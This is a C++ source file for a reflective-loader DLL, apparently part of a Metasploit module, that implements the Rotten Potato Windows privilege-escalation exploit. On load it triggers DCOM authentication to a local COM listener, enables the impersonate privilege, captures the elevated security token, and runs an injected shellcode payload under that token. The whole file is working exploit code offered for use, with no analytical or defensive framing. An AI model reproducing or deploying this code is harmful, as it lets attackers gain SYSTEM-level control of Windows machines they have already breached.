#include "stdafx.h"
#include "ReflectiveLoader.h"
#include "MSFRottenPotato.h"

extern "C" HINSTANCE hAppInstance;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;

DWORD WINAPI ExecutePayload(LPVOID lpPayload)
{
	VOID(*lpCode)() = (VOID(*)())lpPayload;
	lpCode();
	return 0;
}

DWORD WINAPI RottenPotato(LPVOID lpPayload)
{
	CMSFRottenPotato* test = new CMSFRottenPotato();
	test->startCOMListenerThread();
	test->startRPCConnectionThread();
	test->triggerDCOM();
	int ret = 0;
	while (true) {
		if (test->negotiator->authResult != -1) {
			/*Enable the priv if possible*/
			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;

			// Get a token for this process. 

			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return 0;

			// Get the LUID for the Impersonate privilege. 
			int res = LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME,
				&tkp.Privileges[0].Luid);

			tkp.PrivilegeCount = 1;  // one privilege to set    
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			// Get the impersonate priv for this process. 
			res = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			HANDLE elevated_token;
			QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);

			DWORD threadId;
			HANDLE payloadThread;

			payloadThread = CreateThread(NULL, 0, ExecutePayload, lpPayload, CREATE_SUSPENDED, &threadId);
			SetThreadToken(&payloadThread, elevated_token);
			ResumeThread(payloadThread);

			return ret;
		}
		else {
			Sleep(500);
		}
	}
	return ret;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		RottenPotato(lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}